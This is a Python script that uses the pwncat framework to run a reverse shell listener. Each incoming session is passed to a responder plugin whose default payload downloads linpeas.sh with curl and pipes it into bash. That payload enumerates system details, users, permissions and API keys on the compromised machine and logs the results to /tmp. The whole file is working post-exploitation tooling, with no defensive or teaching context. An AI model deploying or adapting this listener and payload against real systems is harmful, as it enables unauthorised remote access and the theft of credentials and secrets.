#!/usr/bin/env python3
import os
from pwncat.util import console
import pwncat.manager
import signal
import sys
import subprocess
from pathlib import Path
import argparse

parser = argparse.ArgumentParser(description='reverse shell listener')
parser.add_argument('--port',
                    dest='reverse_shell_port', type=int, default=4444, help='listen port')
parser.add_argument('--host',
                    dest='reverse_shell_host', type=str, default=None, help='hostname/ip for the this reverse shell host. Used to reestablish connection or second stage.')
parser.add_argument('--payload', dest='default_payload', type=str, default='curl -L https://github.com/carlospolop/PEASS-ng/releases/download/20240218-68f9adb3/linpeas.sh | /bin/bash -s -- -s -N -o system_information,container,cloud,procs_crons_timers_srvcs_sockets,users_information,software_information,interesting_files,interesting_perms_files,api_keys_regex | tee /tmp/linpeas.txt', help='default payload is TASK not specified/found.')

args = parser.parse_args()


def get_self_ip():
    result = subprocess.run(
        ['/bin/bash', '-c', f'curl -s http://ipv4.icanhazip.com'], cwd='/tmp', capture_output=True, text=True)
    return result.stdout


def signal_handler(sig, frame):
    print('Interrupt caught...')
    session_lock = Path("/tmp/pwncat_session.lock")
    if session_lock.exists():
        session_lock.unlink()
    sys.exit(0)


def new_session(session: pwncat.manager.Session):
    # Returning false causes the session to be removed immediately
    session.log("new session")
    if args.reverse_shell_host is None:
        reverse_shell_host = get_self_ip()
    else:
        reverse_shell_host = args.reverse_shell_host
    session.log(f"host: {reverse_shell_host}:{args.reverse_shell_port}")
    try:
        session.run(module="responder", reverse_shell_host=reverse_shell_host,
                    reverse_shell_port=args.reverse_shell_port, default_payload=args.default_payload)
    except Exception as e:
        session.log(f'Error executing bash script: {e}')
        raise e

    return False


# add interrupt handler for cleanup of lock file
signal.signal(signal.SIGINT, signal_handler)

with pwncat.manager.Manager() as manager:
    # Establish a pwncat session
    manager.load_modules(str(Path.joinpath(
        Path.cwd(), Path("plugins"))))
    manager.config.set("verbose", True, glob=True)

    with console.status("creating listener..."):
        listener = manager.create_listener(
            protocol="socket",
            host="0.0.0.0",
            port=args.reverse_shell_port,
            platform="linux",
            established=new_session
        )

    manager.log("listener created")

    while listener.is_alive():
        pass
